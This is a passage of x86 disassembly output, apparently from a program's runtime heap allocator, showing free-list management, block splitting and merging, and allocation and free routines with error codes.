  401d5d:	e8 8a f6 ff ff       	call   0x4013ec
  401d62:	c6 04 24 01          	movb   $0x1,(%esp)
  401d66:	8a 04 24             	mov    (%esp),%al
  401d69:	83 c4 0c             	add    $0xc,%esp
  401d6c:	5d                   	pop    %ebp
  401d6d:	5f                   	pop    %edi
  401d6e:	5e                   	pop    %esi
  401d6f:	5b                   	pop    %ebx
  401d70:	c3                   	ret
  401d71:	8d 40 00             	lea    0x0(%eax),%eax
  401d74:	53                   	push   %ebx
  401d75:	56                   	push   %esi
  401d76:	57                   	push   %edi
  401d77:	8b f2                	mov    %edx,%esi
  401d79:	8b f8                	mov    %eax,%edi
  401d7b:	8b df                	mov    %edi,%ebx
  401d7d:	89 73 08             	mov    %esi,0x8(%ebx)
  401d80:	8b c3                	mov    %ebx,%eax
  401d82:	03 c6                	add    %esi,%eax
  401d84:	83 e8 0c             	sub    $0xc,%eax
  401d87:	89 70 08             	mov    %esi,0x8(%eax)
  401d8a:	81 fe 00 10 00 00    	cmp    $0x1000,%esi
  401d90:	7f 37                	jg     0x401dc9
  401d92:	8b d6                	mov    %esi,%edx
  401d94:	85 d2                	test   %edx,%edx
  401d96:	79 03                	jns    0x401d9b
  401d98:	83 c2 03             	add    $0x3,%edx
  401d9b:	c1 fa 02             	sar    $0x2,%edx
  401d9e:	a1 1c 46 42 00       	mov    0x42461c,%eax
  401da3:	8b 44 90 f4          	mov    -0xc(%eax,%edx,4),%eax
  401da7:	85 c0                	test   %eax,%eax
  401da9:	75 10                	jne    0x401dbb
  401dab:	a1 1c 46 42 00       	mov    0x42461c,%eax
  401db0:	89 5c 90 f4          	mov    %ebx,-0xc(%eax,%edx,4)
  401db4:	89 5b 04             	mov    %ebx,0x4(%ebx)
  401db7:	89 1b                	mov    %ebx,(%ebx)
  401db9:	eb 3a                	jmp    0x401df5
  401dbb:	8b 10                	mov    (%eax),%edx
  401dbd:	89 43 04             	mov    %eax,0x4(%ebx)
  401dc0:	89 13                	mov    %edx,(%ebx)
  401dc2:	89 18                	mov    %ebx,(%eax)
  401dc4:	89 5a 04             	mov    %ebx,0x4(%edx)
  401dc7:	eb 2c                	jmp    0x401df5
  401dc9:	81 fe 00 3c 00 00    	cmp    $0x3c00,%esi
  401dcf:	7c 0d                	jl     0x401dde
  401dd1:	8b d6                	mov    %esi,%edx
  401dd3:	8b c7                	mov    %edi,%eax
  401dd5:	e8 ea fe ff ff       	call   0x401cc4
  401dda:	84 c0                	test   %al,%al
  401ddc:	75 17                	jne    0x401df5
  401dde:	a1 10 46 42 00       	mov    0x424610,%eax
  401de3:	89 1d 10 46 42 00    	mov    %ebx,0x424610
  401de9:	8b 10                	mov    (%eax),%edx
  401deb:	89 43 04             	mov    %eax,0x4(%ebx)
  401dee:	89 13                	mov    %edx,(%ebx)
  401df0:	89 18                	mov    %ebx,(%eax)
  401df2:	89 5a 04             	mov    %ebx,0x4(%edx)
  401df5:	5f                   	pop    %edi
  401df6:	5e                   	pop    %esi
  401df7:	5b                   	pop    %ebx
  401df8:	c3                   	ret
  401df9:	8d 40 00             	lea    0x0(%eax),%eax
  401dfc:	83 3d 14 46 42 00 00 	cmpl   $0x0,0x424614
  401e03:	7e 40                	jle    0x401e45
  401e05:	83 3d 14 46 42 00 0c 	cmpl   $0xc,0x424614
  401e0c:	7d 0c                	jge    0x401e1a
  401e0e:	c7 05 c0 45 42 00 07 	movl   $0x7,0x4245c0
  401e15:	00 00 00 
  401e18:	eb 2b                	jmp    0x401e45
  401e1a:	a1 14 46 42 00       	mov    0x424614,%eax
  401e1f:	83 c8 02             	or     $0x2,%eax
  401e22:	8b 15 18 46 42 00    	mov    0x424618,%edx
  401e28:	89 02                	mov    %eax,(%edx)
  401e2a:	a1 18 46 42 00       	mov    0x424618,%eax
  401e2f:	83 c0 04             	add    $0x4,%eax
  401e32:	e8 99 fd ff ff       	call   0x401bd0
  401e37:	33 c0                	xor    %eax,%eax
  401e39:	a3 18 46 42 00       	mov    %eax,0x424618
  401e3e:	33 c0                	xor    %eax,%eax
  401e40:	a3 14 46 42 00       	mov    %eax,0x424614
  401e45:	c3                   	ret
  401e46:	8b c0                	mov    %eax,%eax
  401e48:	53                   	push   %ebx
  401e49:	56                   	push   %esi
  401e4a:	57                   	push   %edi
  401e4b:	83 c4 f0             	add    $0xfffffff0,%esp
  401e4e:	8b f0                	mov    %eax,%esi
  401e50:	8d 3c 24             	lea    (%esp),%edi
  401e53:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401e54:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401e55:	8b fc                	mov    %esp,%edi
  401e57:	e8 a0 ff ff ff       	call   0x401dfc
  401e5c:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401e60:	8b d7                	mov    %edi,%edx
  401e62:	b8 20 46 42 00       	mov    $0x424620,%eax
  401e67:	e8 10 f5 ff ff       	call   0x40137c
  401e6c:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  401e70:	85 db                	test   %ebx,%ebx
  401e72:	75 04                	jne    0x401e78
  401e74:	33 c0                	xor    %eax,%eax
  401e76:	eb 52                	jmp    0x401eca
  401e78:	8b 07                	mov    (%edi),%eax
  401e7a:	3b d8                	cmp    %eax,%ebx
  401e7c:	73 0a                	jae    0x401e88
  401e7e:	e8 99 fd ff ff       	call   0x401c1c
  401e83:	29 07                	sub    %eax,(%edi)
  401e85:	01 47 04             	add    %eax,0x4(%edi)
  401e88:	8b 07                	mov    (%edi),%eax
  401e8a:	03 47 04             	add    0x4(%edi),%eax
  401e8d:	8b f3                	mov    %ebx,%esi
  401e8f:	03 74 24 0c          	add    0xc(%esp),%esi
  401e93:	3b c6                	cmp    %esi,%eax
  401e95:	73 08                	jae    0x401e9f
  401e97:	e8 f0 fd ff ff       	call   0x401c8c
  401e9c:	01 47 04             	add    %eax,0x4(%edi)
  401e9f:	8b 07                	mov    (%edi),%eax
  401ea1:	03 47 04             	add    0x4(%edi),%eax
  401ea4:	3b f0                	cmp    %eax,%esi
  401ea6:	75 11                	jne    0x401eb9
  401ea8:	83 e8 04             	sub    $0x4,%eax
  401eab:	ba 04 00 00 00       	mov    $0x4,%edx
  401eb0:	e8 eb fc ff ff       	call   0x401ba0
  401eb5:	83 6f 04 04          	subl   $0x4,0x4(%edi)
  401eb9:	8b 07                	mov    (%edi),%eax
  401ebb:	a3 18 46 42 00       	mov    %eax,0x424618
  401ec0:	8b 47 04             	mov    0x4(%edi),%eax
  401ec3:	a3 14 46 42 00       	mov    %eax,0x424614
  401ec8:	b0 01                	mov    $0x1,%al
  401eca:	83 c4 10             	add    $0x10,%esp
  401ecd:	5f                   	pop    %edi
  401ece:	5e                   	pop    %esi
  401ecf:	5b                   	pop    %ebx
  401ed0:	c3                   	ret
  401ed1:	8d 40 00             	lea    0x0(%eax),%eax
  401ed4:	53                   	push   %ebx
  401ed5:	83 c4 f8             	add    $0xfffffff8,%esp
  401ed8:	8b d8                	mov    %eax,%ebx
  401eda:	8b d4                	mov    %esp,%edx
  401edc:	8d 43 04             	lea    0x4(%ebx),%eax
  401edf:	e8 44 f8 ff ff       	call   0x401728
  401ee4:	83 3c 24 00          	cmpl   $0x0,(%esp)
  401ee8:	74 0b                	je     0x401ef5
  401eea:	8b c4                	mov    %esp,%eax
  401eec:	e8 57 ff ff ff       	call   0x401e48
  401ef1:	84 c0                	test   %al,%al
  401ef3:	75 04                	jne    0x401ef9
  401ef5:	33 c0                	xor    %eax,%eax
  401ef7:	eb 02                	jmp    0x401efb
  401ef9:	b0 01                	mov    $0x1,%al
  401efb:	59                   	pop    %ecx
  401efc:	5a                   	pop    %edx
  401efd:	5b                   	pop    %ebx
  401efe:	c3                   	ret
  401eff:	90                   	nop
  401f00:	53                   	push   %ebx
  401f01:	56                   	push   %esi
  401f02:	83 c4 f8             	add    $0xfffffff8,%esp
  401f05:	8b f2                	mov    %edx,%esi
  401f07:	8b d8                	mov    %eax,%ebx
  401f09:	8b cc                	mov    %esp,%ecx
  401f0b:	8d 56 04             	lea    0x4(%esi),%edx
  401f0e:	8b c3                	mov    %ebx,%eax
  401f10:	e8 a3 f8 ff ff       	call   0x4017b8
  401f15:	83 3c 24 00          	cmpl   $0x0,(%esp)
  401f19:	74 0b                	je     0x401f26
  401f1b:	8b c4                	mov    %esp,%eax
  401f1d:	e8 26 ff ff ff       	call   0x401e48
  401f22:	84 c0                	test   %al,%al
  401f24:	75 04                	jne    0x401f2a
  401f26:	33 c0                	xor    %eax,%eax
  401f28:	eb 02                	jmp    0x401f2c
  401f2a:	b0 01                	mov    $0x1,%al
  401f2c:	59                   	pop    %ecx
  401f2d:	5a                   	pop    %edx
  401f2e:	5e                   	pop    %esi
  401f2f:	5b                   	pop    %ebx
  401f30:	c3                   	ret
  401f31:	8d 40 00             	lea    0x0(%eax),%eax
  401f34:	33 d2                	xor    %edx,%edx
  401f36:	85 c0                	test   %eax,%eax
  401f38:	79 03                	jns    0x401f3d
  401f3a:	83 c0 03             	add    $0x3,%eax
  401f3d:	c1 f8 02             	sar    $0x2,%eax
  401f40:	3d 00 04 00 00       	cmp    $0x400,%eax
  401f45:	7f 16                	jg     0x401f5d
  401f47:	8b 15 1c 46 42 00    	mov    0x42461c,%edx
  401f4d:	8b 54 82 f4          	mov    -0xc(%edx,%eax,4),%edx
  401f51:	85 d2                	test   %edx,%edx
  401f53:	75 08                	jne    0x401f5d
  401f55:	40                   	inc    %eax
  401f56:	3d 01 04 00 00       	cmp    $0x401,%eax
  401f5b:	75 ea                	jne    0x401f47
  401f5d:	8b c2                	mov    %edx,%eax
  401f5f:	c3                   	ret
  401f60:	53                   	push   %ebx
  401f61:	56                   	push   %esi
  401f62:	57                   	push   %edi
  401f63:	55                   	push   %ebp
  401f64:	8b f0                	mov    %eax,%esi
  401f66:	bf 10 46 42 00       	mov    $0x424610,%edi
  401f6b:	bd 14 46 42 00       	mov    $0x424614,%ebp
  401f70:	8b 1d 08 46 42 00    	mov    0x424608,%ebx
  401f76:	3b 73 08             	cmp    0x8(%ebx),%esi
  401f79:	0f 8e 84 00 00 00    	jle    0x402003
  401f7f:	8b 1f                	mov    (%edi),%ebx
  401f81:	8b 43 08             	mov    0x8(%ebx),%eax
  401f84:	3b f0                	cmp    %eax,%esi
  401f86:	7e 7b                	jle    0x402003
  401f88:	89 73 08             	mov    %esi,0x8(%ebx)
  401f8b:	8b 5b 04             	mov    0x4(%ebx),%ebx
  401f8e:	3b 73 08             	cmp    0x8(%ebx),%esi
  401f91:	7f f8                	jg     0x401f8b
  401f93:	8b 17                	mov    (%edi),%edx
  401f95:	89 42 08             	mov    %eax,0x8(%edx)
  401f98:	3b 1f                	cmp    (%edi),%ebx
  401f9a:	74 04                	je     0x401fa0
  401f9c:	89 1f                	mov    %ebx,(%edi)
  401f9e:	eb 63                	jmp    0x402003
  401fa0:	81 fe 00 10 00 00    	cmp    $0x1000,%esi
  401fa6:	7f 0d                	jg     0x401fb5
  401fa8:	8b c6                	mov    %esi,%eax
  401faa:	e8 85 ff ff ff       	call   0x401f34
  401faf:	8b d8                	mov    %eax,%ebx
  401fb1:	85 db                	test   %ebx,%ebx
  401fb3:	75 4e                	jne    0x402003
  401fb5:	8b c6                	mov    %esi,%eax
  401fb7:	e8 18 ff ff ff       	call   0x401ed4
  401fbc:	84 c0                	test   %al,%al
  401fbe:	75 07                	jne    0x401fc7
  401fc0:	33 c0                	xor    %eax,%eax
  401fc2:	e9 88 00 00 00       	jmp    0x40204f
  401fc7:	3b 75 00             	cmp    0x0(%ebp),%esi
  401fca:	7f a4                	jg     0x401f70
  401fcc:	29 75 00             	sub    %esi,0x0(%ebp)
  401fcf:	83 7d 00 0c          	cmpl   $0xc,0x0(%ebp)
  401fd3:	7d 08                	jge    0x401fdd
  401fd5:	03 75 00             	add    0x0(%ebp),%esi
  401fd8:	33 c0                	xor    %eax,%eax
  401fda:	89 45 00             	mov    %eax,0x0(%ebp)
  401fdd:	a1 18 46 42 00       	mov    0x424618,%eax
  401fe2:	01 35 18 46 42 00    	add    %esi,0x424618
  401fe8:	8b d6                	mov    %esi,%edx
  401fea:	83 ca 02             	or     $0x2,%edx
  401fed:	89 10                	mov    %edx,(%eax)
  401fef:	83 c0 04             	add    $0x4,%eax
  401ff2:	ff 05 ac 45 42 00    	incl   0x4245ac
  401ff8:	83 ee 04             	sub    $0x4,%esi
  401ffb:	01 35 b0 45 42 00    	add    %esi,0x4245b0
  402001:	eb 4c                	jmp    0x40204f
  402003:	8b c3                	mov    %ebx,%eax
  402005:	e8 02 fb ff ff       	call   0x401b0c
  40200a:	8b 53 08             	mov    0x8(%ebx),%edx
  40200d:	8b c2                	mov    %edx,%eax
  40200f:	2b c6                	sub    %esi,%eax
  402011:	83 f8 0c             	cmp    $0xc,%eax
  402014:	7c 0c                	jl     0x402022
  402016:	8b d3                	mov    %ebx,%edx
  402018:	03 d6                	add    %esi,%edx
  40201a:	92                   	xchg   %eax,%edx
  40201b:	e8 54 fd ff ff       	call   0x401d74
  402020:	eb 12                	jmp    0x402034
  402022:	8b f2                	mov    %edx,%esi
  402024:	3b 1f                	cmp    (%edi),%ebx
  402026:	75 05                	jne    0x40202d
  402028:	8b 43 04             	mov    0x4(%ebx),%eax
  40202b:	89 07                	mov    %eax,(%edi)
  40202d:	8b c3                	mov    %ebx,%eax
  40202f:	03 c6                	add    %esi,%eax
  402031:	83 20 fe             	andl   $0xfffffffe,(%eax)
  402034:	8b c3                	mov    %ebx,%eax
  402036:	8b d6                	mov    %esi,%edx
  402038:	83 ca 02             	or     $0x2,%edx
  40203b:	89 10                	mov    %edx,(%eax)
  40203d:	83 c0 04             	add    $0x4,%eax
  402040:	ff 05 ac 45 42 00    	incl   0x4245ac
  402046:	83 ee 04             	sub    $0x4,%esi
  402049:	01 35 b0 45 42 00    	add    %esi,0x4245b0
  40204f:	5d                   	pop    %ebp
  402050:	5f                   	pop    %edi
  402051:	5e                   	pop    %esi
  402052:	5b                   	pop    %ebx
  402053:	c3                   	ret
  402054:	55                   	push   %ebp
  402055:	8b ec                	mov    %esp,%ebp
  402057:	83 c4 f8             	add    $0xfffffff8,%esp
  40205a:	53                   	push   %ebx
  40205b:	56                   	push   %esi
  40205c:	57                   	push   %edi
  40205d:	8b d8                	mov    %eax,%ebx
  40205f:	80 3d bc 45 42 00 00 	cmpb   $0x0,0x4245bc
  402066:	75 09                	jne    0x402071
  402068:	e8 fb f8 ff ff       	call   0x401968
  40206d:	84 c0                	test   %al,%al
  40206f:	74 08                	je     0x402079
  402071:	81 fb f8 ff ff 7f    	cmp    $0x7ffffff8,%ebx
  402077:	7e 0a                	jle    0x402083
  402079:	33 c0                	xor    %eax,%eax
  40207b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40207e:	e9 54 01 00 00       	jmp    0x4021d7
  402083:	33 c9                	xor    %ecx,%ecx
  402085:	55                   	push   %ebp
  402086:	68 d0 21 40 00       	push   $0x4021d0
  40208b:	64 ff 31             	push   %fs:(%ecx)
  40208e:	64 89 21             	mov    %esp,%fs:(%ecx)
  402091:	80 3d 45 40 42 00 00 	cmpb   $0x0,0x424045
  402098:	74 0a                	je     0x4020a4
  40209a:	68 c4 45 42 00       	push   $0x4245c4
  40209f:	e8 20 f2 ff ff       	call   0x4012c4
  4020a4:	83 c3 07             	add    $0x7,%ebx
  4020a7:	83 e3 fc             	and    $0xfffffffc,%ebx
  4020aa:	83 fb 0c             	cmp    $0xc,%ebx
  4020ad:	7d 05                	jge    0x4020b4
  4020af:	bb 0c 00 00 00       	mov    $0xc,%ebx
  4020b4:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  4020ba:	0f 8f 93 00 00 00    	jg     0x402153
  4020c0:	8b c3                	mov    %ebx,%eax
  4020c2:	85 c0                	test   %eax,%eax
  4020c4:	79 03                	jns    0x4020c9
  4020c6:	83 c0 03             	add    $0x3,%eax
  4020c9:	c1 f8 02             	sar    $0x2,%eax
  4020cc:	8b 15 1c 46 42 00    	mov    0x42461c,%edx
  4020d2:	8b 54 82 f4          	mov    -0xc(%edx,%eax,4),%edx
  4020d6:	85 d2                	test   %edx,%edx
  4020d8:	74 79                	je     0x402153
  4020da:	8b f2                	mov    %edx,%esi
  4020dc:	8b c6                	mov    %esi,%eax
  4020de:	03 c3                	add    %ebx,%eax
  4020e0:	83 20 fe             	andl   $0xfffffffe,(%eax)
  4020e3:	8b 42 04             	mov    0x4(%edx),%eax
  4020e6:	3b d0                	cmp    %eax,%edx
  4020e8:	75 1a                	jne    0x402104
  4020ea:	8b c3                	mov    %ebx,%eax
  4020ec:	85 c0                	test   %eax,%eax
  4020ee:	79 03                	jns    0x4020f3
  4020f0:	83 c0 03             	add    $0x3,%eax
  4020f3:	c1 f8 02             	sar    $0x2,%eax
  4020f6:	8b 0d 1c 46 42 00    	mov    0x42461c,%ecx
  4020fc:	33 ff                	xor    %edi,%edi
  4020fe:	89 7c 81 f4          	mov    %edi,-0xc(%ecx,%eax,4)
  402102:	eb 26                	jmp    0x40212a
  402104:	8b cb                	mov    %ebx,%ecx
  402106:	85 c9                	test   %ecx,%ecx
  402108:	79 03                	jns    0x40210d
  40210a:	83 c1 03             	add    $0x3,%ecx
  40210d:	c1 f9 02             	sar    $0x2,%ecx
  402110:	8b 3d 1c 46 42 00    	mov    0x42461c,%edi
  402116:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  40211a:	8b 0a                	mov    (%edx),%ecx
  40211c:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40211f:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  402122:	89 41 04             	mov    %eax,0x4(%ecx)
  402125:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  402128:	89 08                	mov    %ecx,(%eax)
  40212a:	8b c6                	mov    %esi,%eax
  40212c:	8b 52 08             	mov    0x8(%edx),%edx
  40212f:	83 ca 02             	or     $0x2,%edx
  402132:	89 10                	mov    %edx,(%eax)
  402134:	83 c0 04             	add    $0x4,%eax
  402137:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40213a:	ff 05 ac 45 42 00    	incl   0x4245ac
  402140:	83 eb 04             	sub    $0x4,%ebx
  402143:	01 1d b0 45 42 00    	add    %ebx,0x4245b0
  402149:	e8 02 14 00 00       	call   0x403550
  40214e:	e9 84 00 00 00       	jmp    0x4021d7
  402153:	3b 1d 14 46 42 00    	cmp    0x424614,%ebx
  402159:	7f 4a                	jg     0x4021a5
  40215b:	29 1d 14 46 42 00    	sub    %ebx,0x424614
  402161:	83 3d 14 46 42 00 0c 	cmpl   $0xc,0x424614
  402168:	7d 0d                	jge    0x402177
  40216a:	03 1d 14 46 42 00    	add    0x424614,%ebx
  402170:	33 c0                	xor    %eax,%eax
  402172:	a3 14 46 42 00       	mov    %eax,0x424614
  402177:	a1 18 46 42 00       	mov    0x424618,%eax
  40217c:	01 1d 18 46 42 00    	add    %ebx,0x424618
  402182:	8b d3                	mov    %ebx,%edx
  402184:	83 ca 02             	or     $0x2,%edx
  402187:	89 10                	mov    %edx,(%eax)
  402189:	83 c0 04             	add    $0x4,%eax
  40218c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40218f:	ff 05 ac 45 42 00    	incl   0x4245ac
  402195:	83 eb 04             	sub    $0x4,%ebx
  402198:	01 1d b0 45 42 00    	add    %ebx,0x4245b0
  40219e:	e8 ad 13 00 00       	call   0x403550
  4021a3:	eb 32                	jmp    0x4021d7
  4021a5:	8b c3                	mov    %ebx,%eax
  4021a7:	e8 b4 fd ff ff       	call   0x401f60
  4021ac:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4021af:	33 c0                	xor    %eax,%eax
  4021b1:	5a                   	pop    %edx
  4021b2:	59                   	pop    %ecx
  4021b3:	59                   	pop    %ecx
  4021b4:	64 89 10             	mov    %edx,%fs:(%eax)
  4021b7:	68 d7 21 40 00       	push   $0x4021d7
  4021bc:	80 3d 45 40 42 00 00 	cmpb   $0x0,0x424045
  4021c3:	74 0a                	je     0x4021cf
  4021c5:	68 c4 45 42 00       	push   $0x4245c4
  4021ca:	e8 fd f0 ff ff       	call   0x4012cc
  4021cf:	c3                   	ret
  4021d0:	e9 97 12 00 00       	jmp    0x40346c
  4021d5:	eb e5                	jmp    0x4021bc
  4021d7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4021da:	5f                   	pop    %edi
  4021db:	5e                   	pop    %esi
  4021dc:	5b                   	pop    %ebx
  4021dd:	59                   	pop    %ecx
  4021de:	59                   	pop    %ecx
  4021df:	5d                   	pop    %ebp
  4021e0:	c3                   	ret
  4021e1:	8d 40 00             	lea    0x0(%eax),%eax
  4021e4:	55                   	push   %ebp
  4021e5:	8b ec                	mov    %esp,%ebp
  4021e7:	51                   	push   %ecx
  4021e8:	53                   	push   %ebx
  4021e9:	56                   	push   %esi
  4021ea:	57                   	push   %edi
  4021eb:	8b d8                	mov    %eax,%ebx
  4021ed:	33 c0                	xor    %eax,%eax
  4021ef:	a3 c0 45 42 00       	mov    %eax,0x4245c0
  4021f4:	80 3d bc 45 42 00 00 	cmpb   $0x0,0x4245bc
  4021fb:	75 1f                	jne    0x40221c
  4021fd:	e8 66 f7 ff ff       	call   0x401968
  402202:	84 c0                	test   %al,%al
  402204:	75 16                	jne    0x40221c
  402206:	c7 05 c0 45 42 00 08 	movl   $0x8,0x4245c0
  40220d:	00 00 00 
  402210:	c7 45 fc 08 00 00 00 	movl   $0x8,-0x4(%ebp)
  402217:	e9 61 01 00 00       	jmp    0x40237d
  40221c:	33 c9                	xor    %ecx,%ecx
  40221e:	55                   	push   %ebp
  40221f:	68 76 23 40 00       	push   $0x402376
  402224:	64 ff 31             	push   %fs:(%ecx)
  402227:	64 89 21             	mov    %esp,%fs:(%ecx)
  40222a:	80 3d 45 40 42 00 00 	cmpb   $0x0,0x424045
  402231:	74 0a                	je     0x40223d
  402233:	68 c4 45 42 00       	push   $0x4245c4
  402238:	e8 87 f0 ff ff       	call   0x4012c4
  40223d:	8b f3                	mov    %ebx,%esi
  40223f:	83 ee 04             	sub    $0x4,%esi
  402242:	8b 1e                	mov    (%esi),%ebx
  402244:	f6 c3 02             	test   $0x2,%bl
  402247:	75 0f                	jne    0x402258
  402249:	c7 05 c0 45 42 00 09 	movl   $0x9,0x4245c0
  402250:	00 00 00 
  402253:	e9 f5 00 00 00       	jmp    0x40234d
  402258:	ff 0d ac 45 42 00    	decl   0x4245ac
  40225e:	8b c3                	mov    %ebx,%eax
  402260:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  402265:	83 e8 04             	sub    $0x4,%eax
  402268:	29 05 b0 45 42 00    	sub    %eax,0x4245b0
  40226e:	f6 c3 01             	test   $0x1,%bl
  402271:	74 45                	je     0x4022b8
  402273:	8b c6                	mov    %esi,%eax
  402275:	83 e8 0c             	sub    $0xc,%eax
  402278:	8b 50 08             	mov    0x8(%eax),%edx
  40227b:	83 fa 0c             	cmp    $0xc,%edx
  40227e:	7c 08                	jl     0x402288
  402280:	f7 c2 03 00 00 80    	test   $0x80000003,%edx
  402286:	74 0f                	je     0x402297
  402288:	c7 05 c0 45 42 00 0a 	movl   $0xa,0x4245c0
  40228f:	00 00 00 
  402292:	e9 b6 00 00 00       	jmp    0x40234d
  402297:	8b c6                	mov    %esi,%eax
  402299:	2b c2                	sub    %edx,%eax
  40229b:	3b 50 08             	cmp    0x8(%eax),%edx
  40229e:	74 0f                	je     0x4022af
  4022a0:	c7 05 c0 45 42 00 0a 	movl   $0xa,0x4245c0
  4022a7:	00 00 00 
  4022aa:	e9 9e 00 00 00       	jmp    0x40234d
  4022af:	03 da                	add    %edx,%ebx
  4022b1:	8b f0                	mov    %eax,%esi
  4022b3:	e8 54 f8 ff ff       	call   0x401b0c
  4022b8:	81 e3 fc ff ff 7f    	and    $0x7ffffffc,%ebx
  4022be:	8b c6                	mov    %esi,%eax
  4022c0:	03 c3                	add    %ebx,%eax
  4022c2:	8b f8                	mov    %eax,%edi
  4022c4:	3b 3d 18 46 42 00    	cmp    0x424618,%edi
  4022ca:	75 2c                	jne    0x4022f8
  4022cc:	29 1d 18 46 42 00    	sub    %ebx,0x424618
  4022d2:	01 1d 14 46 42 00    	add    %ebx,0x424614
  4022d8:	81 3d 14 46 42 00 00 	cmpl   $0x3c00,0x424614
  4022df:	3c 00 00 
  4022e2:	7e 05                	jle    0x4022e9
  4022e4:	e8 13 fb ff ff       	call   0x401dfc
  4022e9:	33 c0                	xor    %eax,%eax
  4022eb:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4022ee:	e8 5d 12 00 00       	call   0x403550
  4022f3:	e9 85 00 00 00       	jmp    0x40237d
  4022f8:	8b 10                	mov    (%eax),%edx
  4022fa:	f6 c2 02             	test   $0x2,%dl
  4022fd:	74 1c                	je     0x40231b
  4022ff:	81 e2 fc ff ff 7f    	and    $0x7ffffffc,%edx
  402305:	83 fa 04             	cmp    $0x4,%edx
  402308:	7d 0c                	jge    0x402316
  40230a:	c7 05 c0 45 42 00 0b 	movl   $0xb,0x4245c0
  402311:	00 00 00 
  402314:	eb 37                	jmp    0x40234d
  402316:	83 08 01             	orl    $0x1,(%eax)
  402319:	eb 29                	jmp    0x402344
  40231b:	8b c7                	mov    %edi,%eax
  40231d:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  402321:	74 0b                	je     0x40232e
  402323:	83 38 00             	cmpl   $0x0,(%eax)
  402326:	74 06                	je     0x40232e
  402328:	83 78 08 0c          	cmpl   $0xc,0x8(%eax)
  40232c:	7d 0c                	jge    0x40233a
  40232e:	c7 05 c0 45 42 00 0b 	movl   $0xb,0x4245c0
  402335:	00 00 00 
  402338:	eb 13                	jmp    0x40234d
  40233a:	8b 50 08             	mov    0x8(%eax),%edx
  40233d:	03 da                	add    %edx,%ebx
  40233f:	e8 c8 f7 ff ff       	call   0x401b0c
  402344:	8b d3                	mov    %ebx,%edx
  402346:	8b c6                	mov    %esi,%eax
  402348:	e8 27 fa ff ff       	call   0x401d74
  40234d:	a1 c0 45 42 00       	mov    0x4245c0,%eax
  402352:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402355:	33 c0                	xor    %eax,%eax
  402357:	5a                   	pop    %edx
  402358:	59                   	pop    %ecx
  402359:	59                   	pop    %ecx
  40235a:	64 89 10             	mov    %edx,%fs:(%eax)
  40235d:	68 7d 23 40 00       	push   $0x40237d
  402362:	80 3d 45 40 42 00 00 	cmpb   $0x0,0x424045
  402369:	74 0a                	je     0x402375
  40236b:	68 c4 45 42 00       	push   $0x4245c4
  402370:	e8 57 ef ff ff       	call   0x4012cc
  402375:	c3                   	ret
  402376:	e9 f1 10 00 00       	jmp    0x40346c
  40237b:	eb e5                	jmp    0x402362
  40237d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402380:	5f                   	pop    %edi
  402381:	5e                   	pop    %esi
  402382:	5b                   	pop    %ebx
  402383:	59                   	pop    %ecx
  402384:	5d                   	pop    %ebp
  402385:	c3                   	ret
  402386:	8b c0                	mov    %eax,%eax
  402388:	53                   	push   %ebx
  402389:	56                   	push   %esi
  40238a:	57                   	push   %edi
  40238b:	55                   	push   %ebp
  40238c:	83 c4 f8             	add    $0xfffffff8,%esp
  40238f:	8b f2                	mov    %edx,%esi
  402391:	83 c6 07             	add    $0x7,%esi
  402394:	83 e6 fc             	and    $0xfffffffc,%esi
  402397:	83 fe 0c             	cmp    $0xc,%esi
  40239a:	7d 05                	jge    0x4023a1
  40239c:	be 0c 00 00 00       	mov    $0xc,%esi
  4023a1:	8b e8                	mov    %eax,%ebp
  4023a3:	83 ed 04             	sub    $0x4,%ebp
  4023a6:	8b 7d 00             	mov    0x0(%ebp),%edi
  4023a9:	81 e7 fc ff ff 7f    	and    $0x7ffffffc,%edi
  4023af:	8b c5                	mov    %ebp,%eax
  4023b1:	03 c7                	add    %edi,%eax
  4023b3:	8b d8                	mov    %eax,%ebx
  4023b5:	3b fe                	cmp    %esi,%edi
  4023b7:	75 07                	jne    0x4023c0
  4023b9:	b0 01                	mov    $0x1,%al
  4023bb:	e9 9b 01 00 00       	jmp    0x40255b
  4023c0:	3b fe                	cmp    %esi,%edi
  4023c2:	0f 8e 83 00 00 00    	jle    0x40244b
  4023c8:	8b d7                	mov    %edi,%edx
  4023ca:	2b d6                	sub    %esi,%edx
  4023cc:	89 14 24             	mov    %edx,(%esp)
  4023cf:	3b 1d 18 46 42 00    	cmp    0x424618,%ebx
  4023d5:	75 38                	jne    0x40240f
  4023d7:	8b 04 24             	mov    (%esp),%eax
  4023da:	29 05 18 46 42 00    	sub    %eax,0x424618
  4023e0:	8b 04 24             	mov    (%esp),%eax
  4023e3:	01 05 14 46 42 00    	add    %eax,0x424614
  4023e9:	83 3d 14 46 42 00 0c 	cmpl   $0xc,0x424614
  4023f0:	0f 8d 4c 01 00 00    	jge    0x402542
  4023f6:	8b 04 24             	mov    (%esp),%eax
  4023f9:	01 05 18 46 42 00    	add    %eax,0x424618
  4023ff:	8b 04 24             	mov    (%esp),%eax
  402402:	29 05 14 46 42 00    	sub    %eax,0x424614
  402408:	8b f7                	mov    %edi,%esi
  40240a:	e9 33 01 00 00       	jmp    0x402542
  40240f:	8b d8                	mov    %eax,%ebx
  402411:	f6 03 02             	testb  $0x2,(%ebx)
  402414:	75 0d                	jne    0x402423
  402416:	8b c3                	mov    %ebx,%eax
  402418:	8b 50 08             	mov    0x8(%eax),%edx
  40241b:	01 14 24             	add    %edx,(%esp)
  40241e:	e8 e9 f6 ff ff       	call   0x401b0c
  402423:	83 3c 24 0c          	cmpl   $0xc,(%esp)
  402427:	7c 1b                	jl     0x402444
  402429:	8b dd                	mov    %ebp,%ebx
